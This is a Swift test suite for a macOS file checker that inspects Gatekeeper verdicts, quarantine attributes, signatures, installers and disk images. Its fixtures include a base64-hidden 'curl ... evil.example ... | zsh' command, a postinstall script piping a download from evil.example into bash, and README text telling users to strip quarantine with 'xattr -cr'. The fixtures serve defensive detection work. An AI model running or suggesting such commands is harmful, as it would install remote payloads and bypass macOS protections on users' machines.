import Foundation
import Testing

@testable import MacxCore

// MARK: - Fakes

struct FakeGatekeeper: GatekeeperAssessing {
    var result: GatekeeperResult
    func assess(_ path: String, kind: GatekeeperKind) -> GatekeeperResult { result }
}

struct FakeMounter: DiskImageMounting {
    var contents: URL?
    func mount(_ image: URL) -> URL? { contents }
    func unmount(_ mountPoint: URL) {}
}

struct FakeLookup: HashLookup {
    var known: [String: String]
    func lookup(sha256: String) throws -> String? { known[sha256] }
}

func checker(
    gatekeeper: GatekeeperResult = GatekeeperResult(
        accepted: true, source: "Notarized Developer ID", origin: "Developer ID Application: X (T)"),
    signatures: SignatureChecking = FakeSignatures(byPath: [:]), mounter: DiskImageMounting = FakeMounter(contents: nil),
    lookup: HashLookup? = nil
) -> FileChecker {
    FileChecker(gatekeeper: FakeGatekeeper(result: gatekeeper), signatures: signatures, mounter: mounter, lookup: lookup)
}

// MARK: - Parsing system tool output

@Suite("Gatekeeper and quarantine parsing")
struct GatekeeperParsingTests {
    @Test func acceptedNotarized() {
        let r = GatekeeperResult.parse(
            "/Applications/GIMP.app: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: GNOME Foundation (T25BQ8HSJF)\n",
            status: 0)
        #expect(r.accepted)
        #expect(r.source == "Notarized Developer ID")
        #expect(r.origin == "Developer ID Application: GNOME Foundation (T25BQ8HSJF)")
        #expect(r.isNotarized)
    }

    @Test func rejectedAndErrors() {
        let r = GatekeeperResult.parse("/x/evil.pkg: rejected\nsource=no usable signature\n", status: 3)
        #expect(!r.accepted)
        #expect(r.source == "no usable signature")
        let broken = GatekeeperResult.parse("/A.app: code has no resources but signature indicates they must be present\n", status: 3)
        #expect(!broken.accepted)
        #expect(broken.error == "code has no resources but signature indicates they must be present")
    }

    @Test func quarantineAttribute() throws {
        let q = try #require(QuarantineInfo.parse("01c1;6afdebf1;Zen;7C14DDBC-BC7A-4EC3-89E6-AF8828947186"))
        #expect(q.flags == "01c1")
        #expect(q.agent == "Zen")
        #expect(q.date == Date(timeIntervalSince1970: 0x6afd_ebf1))
        #expect(QuarantineInfo.parse("garbage") == nil)
    }

    @Test func readsTheRealQuarantineAttribute() throws {
        let tmp = try TempDir()
        let f = try tmp.file("downloaded.txt", "x")
        #expect(QuarantineInfo.read(f.path) == nil)
        let value = "0081;6afdebf1;Safari;ABC"
        _ = value.withCString { setxattr(f.path, "com.apple.quarantine", $0, strlen($0), 0, 0) }
        #expect(QuarantineInfo.read(f.path)?.agent == "Safari")
    }
}

// MARK: - Kinds of file

@Suite("File check")
struct FileCheckTests {
    @Test func detectsKinds() throws {
        let tmp = try TempDir()
        let app = try tmp.app("A.app", id: "com.example.a")
        let script = try tmp.file("run.command", "#!/bin/zsh\necho hi\n")
        let bin = tmp.url.appendingPathComponent("tool")
        try machO(cpu: cpuARM64).write(to: bin)
        let pkg = try tmp.file("x.pkg", "xar!")
        let text = try tmp.file("notes.txt", "hello")
        #expect(FileKind.of(app) == .app)
        #expect(FileKind.of(script) == .script)
        #expect(FileKind.of(bin) == .machO)
        #expect(FileKind.of(pkg) == .package)
        #expect(FileKind.of(tmp.url.appendingPathComponent("y.dmg")) == .diskImage)
        #expect(FileKind.of(text) == .text)
    }

    @Test func notarizedAppIsFine() throws {
        let tmp = try TempDir()
        let app = try tmp.app("Good.app", id: "com.example.good")
        let sigs = FakeSignatures(byPath: [app.path: .developerID(team: "T25BQ8HSJF")])
        let report = try checker(signatures: sigs).check(app)
        #expect(report.verdict == .ok)
        #expect(report.sha256 != nil)
    }

    @Test func downloadedUnsignedAppIsHigh() throws {
        let tmp = try TempDir()
        let app = try tmp.app("Cracked.app", id: "com.example.cracked")
        _ = "0081;6afdebf1;Brave;X".withCString { setxattr(app.path, "com.apple.quarantine", $0, strlen($0), 0, 0) }
        let report = try checker(
            gatekeeper: GatekeeperResult(accepted: false, source: "no usable signature"),
            signatures: FakeSignatures(byPath: [app.path: .adHoc])
        ).check(app)
        let rules = Set(report.findings.map(\.rule))
        #expect(rules.contains("gatekeeper-rejected"))
        #expect(rules.contains("adhoc-downloaded"))
        #expect(report.verdict == .dangerous)
        #expect(report.quarantine?.agent == "Brave")
    }

    @Test func appThatInstallsThingsSaysSo() throws {
        let tmp = try TempDir()
        let app = try tmp.app("Helper.app", id: "com.example.helper")
        try tmp.plist("Helper.app/Contents/Library/LaunchDaemons/com.example.helper.daemon.plist", ["Label": "com.example.helper.daemon"])
        try tmp.app("Helper.app/Contents/Library/LoginItems/HelperLogin.app", id: "com.example.helper.login")
        try tmp.plist(
            "Helper.app/Contents/Info.plist",
            [
                "CFBundleIdentifier": "com.example.helper", "CFBundleExecutable": "Main",
                "SMPrivilegedExecutables": ["com.example.helper.root": "anchor apple generic"],
            ])
        let report = try checker(signatures: FakeSignatures(byPath: [app.path: .developerID(team: "T")])).check(app)
        let installs = report.installs.map(\.label)
        #expect(installs.contains { $0.contains("com.example.helper.daemon") })
        #expect(installs.contains { $0.contains("HelperLogin") })
        #expect(installs.contains { $0.contains("com.example.helper.root") })
        #expect(report.findings.contains { $0.rule == "installs-background-items" })
    }

    @Test func scriptThatDecodesAndRunsCodeIsDangerous() throws {
        let tmp = try TempDir()
        let f = try tmp.file(
            "Install.command", "#!/bin/zsh\necho 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh\n")
        let report = try checker().check(f)
        #expect(report.findings.contains { $0.rule == "base64-to-shell" })
        #expect(report.verdict == .dangerous)
        // The hidden command is decoded and shown.
        #expect(report.findings.contains { ($0.detail ?? "").contains("curl -sL https://evil.example/x.sh | zsh") })
    }

    @Test func readmeThatTellsYouToStripQuarantineIsFlagged() throws {
        let tmp = try TempDir()
        let f = try tmp.file("READ ME.txt", "If the app won't open, run:\nsudo xattr -cr /Applications/Cracked.app\n")
        let report = try checker().check(f)
        #expect(report.findings.contains { $0.rule == "quarantine-strip" })
        #expect(report.verdict == .dangerous)
    }

    @Test func packageScriptsAreRead() throws {
        let tmp = try TempDir()
        let scripts = tmp.url.appendingPathComponent("scripts")
        try tmp.file("scripts/postinstall", "#!/bin/sh\ncurl -s https://evil.example/x | bash\n")
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: scripts.appendingPathComponent("postinstall").path)
        let pkg = tmp.url.appendingPathComponent("evil.pkg")
        let made = try? ProcessRunner().run(
            "/usr/bin/pkgbuild",
            [
                "--nopayload", "--scripts", scripts.path, "--identifier", "com.example.evil", "--version", "1", pkg.path,
            ])
        guard made != nil else { return }  // pkgbuild missing: nothing to test
        let report = try checker(gatekeeper: GatekeeperResult(accepted: false, source: "no usable signature")).check(pkg)
        let rules = Set(report.findings.map(\.rule))
        #expect(rules.contains("download-to-shell"))
        #expect(rules.contains("unsigned-package"))
        #expect(report.installs.contains { $0.label.contains("postinstall") })
        #expect(report.verdict == .dangerous)
    }

    @Test func diskImageContentsAreChecked() throws {
        let tmp = try TempDir()
        try tmp.app("mounted/Cool.app", id: "com.example.cool")
        try tmp.file("mounted/Install.txt", "Open Terminal and paste: xattr -cr /Applications/Cool.app\n")
        let dmg = try tmp.file("cool.dmg", "fake")
        let report = try checker(mounter: FakeMounter(contents: tmp.url.appendingPathComponent("mounted"))).check(dmg)
        #expect(report.inner.map(\.path.lastPathComponent).sorted() == ["Cool.app", "Install.txt"])
        #expect(report.findings.contains { $0.rule == "quarantine-strip" })  // bubbled up from Install.txt
        #expect(report.verdict == .dangerous)
    }

    @Test func knownMalwareHashIsDangerous() throws {
        let tmp = try TempDir()
        let f = try tmp.file("payload.bin", "pretend payload")
        let hash = sha256(try Data(contentsOf: f))
        let report = try checker(lookup: FakeLookup(known: [hash: "AtomicStealer"])).check(f)
        #expect(report.findings.contains { $0.rule == "known-malware" && ($0.detail ?? "").contains("AtomicStealer") })
        #expect(report.verdict == .dangerous)
    }

    @Test func missingFileThrows() {
        #expect(throws: FileCheckError.notFound("/no/such/thing")) {
            try checker().check(URL(fileURLWithPath: "/no/such/thing"))
        }
    }
}

@Suite("Base64 payload decoding")
struct Base64DecodeTests {
    @Test func decodesEchoedPayloads() {
        let line = "echo 'Y3VybCAtc0wgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5zaCB8IHpzaA==' | base64 -D | zsh"
        #expect(CommandPatterns.decodedPayloads(in: line) == ["curl -sL https://evil.example/x.sh | zsh"])
        #expect(CommandPatterns.decodedPayloads(in: "echo hi").isEmpty)
        #expect(CommandPatterns.decodedPayloads(in: "echo '!!!notbase64' | base64 -D | sh").isEmpty)
    }
}
